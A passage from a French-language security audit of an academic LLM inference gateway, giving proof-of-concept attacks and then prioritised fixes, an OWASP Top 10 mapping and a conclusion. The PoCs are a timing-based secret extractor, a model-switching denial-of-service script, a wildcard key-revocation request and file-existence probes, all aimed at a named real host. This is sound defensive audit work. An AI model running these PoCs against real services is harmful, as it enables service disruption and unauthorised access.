    # Médiane pour réduire le bruit réseau
    return statistics.median(times)

def extract_secret(known_prefix: str = "") -> str:
    """Extrait le secret caractère par caractère via timing."""
    for position in range(64):  # max 64 chars
        best_char = ""
        best_time = 0
        for c in CHARSET:
            guess = known_prefix + c
            t = measure_time(guess)
            if t > best_time:
                best_time = t
                best_char = c
                print(f"  [{position}] '{c}' → {t/1e6:.2f}ms (best)")
        known_prefix += best_char
        print(f"Secret so far: {known_prefix}")
    return known_prefix
```

**Note :** Ce PoC est théorique. En pratique, le bruit réseau rend cette attaque difficile sur Internet mais faisable sur un réseau local rapide (campus).

---

### PoC-03 : Déni de service par chargement de modèle

```python
import openai
import concurrent.futures

# Utilisateur légitime avec une clé API
client = openai.OpenAI(
    base_url="https://llm.eva.univ-pau.fr/v1",
    api_key="llmgw-<clé_légitime>",
)

def spam_different_models():
    """Alterne entre deux modèles pour forcer des chargements/déchargements."""
    models = ["llama-3.3-70b-instruct", "llama-3.1-8b-instruct"]
    for i in range(100):
        model = models[i % 2]
        try:
            client.chat.completions.create(
                model=model,
                messages=[{"role": "user", "content": "Hi"}],
                max_tokens=1,
            )
        except Exception:
            pass

# 20 req/min max → mais chaque switch de modèle prend ~3 min de chargement
# Résultat : le GPU est occupé en permanence à charger/décharger
```

---

### PoC-04 : Révocation massive de clés via LIKE wildcard

```bash
# Révoquer TOUTES les clés du système
curl -X DELETE "https://llm.eva.univ-pau.fr/admin/keys/%25" \
  -H "Authorization: Bearer <ADMIN_SECRET>"

# Le %25 est le URL-encoding de '%'
# La requête SQL résultante : WHERE key_prefix LIKE '%%'
# → Match toutes les clés
```

---

### PoC-05 : Oracle d'existence de fichiers

```bash
# Tester si un fichier existe sur le serveur
curl -X POST "https://llm.eva.univ-pau.fr/admin/models" \
  -H "Authorization: Bearer <ADMIN_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "probe-1",
    "path": "/etc/passwd.gguf",
    "vram_gb": 1.0
  }'
# Réponse 422 "Fichier introuvable" → le fichier n'existe pas

curl -X POST "https://llm.eva.univ-pau.fr/admin/models" \
  -H "Authorization: Bearer <ADMIN_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "probe-2",
    "path": "/etc/hostname.gguf",
    "vram_gb": 1.0
  }'
# Note : la validation exige l'extension .gguf, ce qui limite l'oracle
# Mais on peut tester des chemins comme "/models/secret-model.gguf"
```

---

## 8. Recommandations priorisées

### Critical

| # | Vulnérabilité | Recommandation | Effort |
|---|--------------|----------------|--------|
| R1 | **VULN-01** Secrets par défaut | Ajouter une vérification au démarrage (`lifespan`) qui **refuse de démarrer** si `INTERNAL_API_KEY` ou `ADMIN_SECRET` contiennent `CHANGE_ME`. Exemple : `if "CHANGE_ME" in settings.admin_secret: raise SystemExit("ADMIN_SECRET non configuré")` | Faible |

### High

| # | Vulnérabilité | Recommandation | Effort |
|---|--------------|----------------|--------|
| R2 | **VULN-02** Timing attack | Remplacer `!=` par `hmac.compare_digest()` dans `require_admin()` : `if not hmac.compare_digest(credentials.credentials, settings.admin_secret)` | Faible |
| R3 | **VULN-03** SSRF indirect | Configurer httpx pour **ne pas suivre les redirections** : `httpx.AsyncClient(follow_redirects=False, ...)`. Vérifier que llama-server n'écoute que sur localhost | Faible |
| R4 | **VULN-04** Path traversal | Rendre `ALLOWED_MODEL_DIRS` **obligatoire** (pas de valeur par défaut vide). Ajouter une vérification `not path.resolve().is_symlink()` pour empêcher les liens symboliques | Moyen |
| R5 | **VULN-05** CORS wildcard | Rendre `allow_origins` configurable via `.env` avec une valeur par défaut stricte : `CORS_ORIGINS=https://llm.eva.univ-pau.fr` | Faible |

### Medium

| # | Vulnérabilité | Recommandation | Effort |
|---|--------------|----------------|--------|
| R6 | **VULN-06** XSS innerHTML | Migrer tous les `innerHTML` vers `textContent` quand c'est du texte, ou utiliser systématiquement `esc()`. Idéalement, adopter un framework réactif léger (Preact, Alpine.js) | Moyen |
| R7 | **VULN-08** Brute-force admin | Ajouter un rate limit spécifique dans nginx pour `/admin/` : `limit_req zone=admin_zone burst=3 nodelay;` avec `limit_req_zone $binary_remote_addr zone=admin_zone:1m rate=5r/m;` | Faible |
| R8 | **VULN-09** DoS modèle | Ajouter un paramètre de configuration listant les modèles que les utilisateurs non-admin peuvent demander (`USER_ALLOWED_MODELS`), ou ne permettre le chargement automatique que pour le modèle par défaut | Moyen |
| R9 | **VULN-10** Token sessionStorage | Utiliser un cookie `HttpOnly; Secure; SameSite=Strict` au lieu de `sessionStorage`. Alternativement, ne pas persister le token du tout (le demander à chaque ouverture de page) | Moyen |
| R10 | **VULN-11** SQLite non chiffré | Évaluer `sqlcipher` (chiffrement AES-256 au repos pour SQLite) si les données sont jugées sensibles | Élevé |
| R11 | **VULN-12** SHA-256 sans sel | Utiliser `hmac.new(salt, raw_key, hashlib.sha256)` avec un sel aléatoire stocké en DB. Ou simplement `hashlib.blake2b(raw_key.encode(), key=app_secret)` | Faible |

### Low

| # | Vulnérabilité | Recommandation | Effort |
|---|--------------|----------------|--------|
| R12 | **VULN-13** Info disclosure | Réduire les informations dans `/health` (ne pas exposer les noms de modèles). Protéger `/admin/dashboard` par le filtrage IP nginx | Faible |
| R13 | **VULN-14** CSP manquante | Ajouter une CSP stricte dans nginx : `add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self' data:;" always;` + ajouter l'attribut `integrity` sur le script Chart.js | Faible |
| R14 | **VULN-15** Logging clé | Masquer `--api-key` dans les logs : remplacer la valeur par `***` dans la commande loggée | Faible |
| R15 | **VULN-16** Validation date | Ajouter une validation ISO 8601 stricte dans `KeyCreate.validate_expiry()` | Faible |
| R16 | **VULN-17** LIKE wildcard | Utiliser une correspondance exacte (`WHERE key_prefix = ?`) ou échapper les caractères LIKE (`key_prefix.replace('%', '').replace('_', '')`) | Faible |

### Info (bonnes pratiques supplémentaires)

| # | Recommandation | Effort |
|---|----------------|--------|
| I1 | Ajouter `CapabilityBoundingSet=`, `SystemCallFilter=@system-service`, `ProtectKernelTunables=true`, `ProtectKernelModules=true` au fichier systemd | Faible |
| I2 | Épingler les versions exactes dans un `requirements.lock` | Faible |
| I3 | Ajouter des tests de sécurité automatisés (fuzzing des endpoints, test des secrets par défaut) | Moyen |
| I4 | Documenter la procédure de rotation des secrets (admin_secret, internal_api_key) | Faible |

---

## 9. Matrice de conformité OWASP Top 10 (2021)

| # | Catégorie OWASP | Statut | Vulnérabilités associées |
|---|----------------|--------|--------------------------|
| A01 | **Broken Access Control** | **Partiellement conforme** | VULN-04 (path traversal), VULN-05 (CSRF/CORS), VULN-13 (info disclosure) |
| A02 | **Cryptographic Failures** | **Partiellement conforme** | VULN-11 (SQLite non chiffré), VULN-12 (SHA-256 sans sel) |
| A03 | **Injection** | **Conforme** | SQL paramétré, YAML safe_load, regex validation. XSS résiduel (VULN-06) |
| A04 | **Insecure Design** | **Partiellement conforme** | VULN-08 (pas de rate limit admin), VULN-09 (DoS modèle) |
| A05 | **Security Misconfiguration** | **Partiellement conforme** | VULN-01 (secrets par défaut), VULN-07 (CORS *), VULN-14 (CSP absente) |
| A06 | **Vulnerable Components** | **Conforme** | Aucune CVE connue dans les dépendances |
| A07 | **Auth Failures** | **Partiellement conforme** | VULN-01 (secrets par défaut), VULN-02 (timing attack), VULN-10 (token storage) |
| A08 | **Software/Data Integrity** | **Partiellement conforme** | CDN sans SRI (VULN-14) |
| A09 | **Logging/Monitoring Failures** | **Partiellement conforme** | VULN-15 (logging clé), pas d'alerte sur tentatives d'auth échouées |
| A10 | **SSRF** | **Partiellement conforme** | VULN-03 (proxy vers llama-server) |

---

## 10. Conclusion

L'EVA Inference Gateway est un projet académique de **qualité supérieure** en termes de conception et d'architecture. Les choix fondamentaux (hachage des clés, YAML safe_load, requêtes SQL paramétrées, durcissement systemd, TLS, filtrage IP) démontrent une conscience sérieuse des enjeux de sécurité.

Les vulnérabilités identifiées sont principalement liées à :
1. **Des valeurs par défaut dangereuses** (secrets `CHANGE_ME`, CORS `*`, `ALLOWED_MODEL_DIRS` vide) — facilement corrigeables
2. **Des omissions de durcissement** (timing attack, CSP, rate limit admin) — bonnes pratiques manquantes
3. **Des risques inhérents à l'architecture** (proxy transparent, chargement de modèle par les utilisateurs) — nécessitent des choix de conception

La vulnérabilité **la plus critique** (secrets par défaut) est trivialement corrigeable par une vérification au démarrage. Les vulnérabilités **High** peuvent toutes être corrigées en quelques lignes de code.

Pour un déploiement en production (même académique), les corrections **Critical** et **High** sont **impératives**. Les corrections **Medium** sont **fortement recommandées**. Les corrections **Low** et **Info** sont des améliorations de durcissement qui élèveraient le niveau de sécurité au standard professionnel.

---

> **Note méthodologique :** Cet audit est basé sur une revue statique du code source. Une analyse dynamique (pentesting actif avec des outils comme Burp Suite, fuzzing des endpoints, tests de charge) apporterait des résultats complémentaires. L'audit des composants externes (llama-server, NVIDIA drivers, kernel Linux) est hors périmètre.
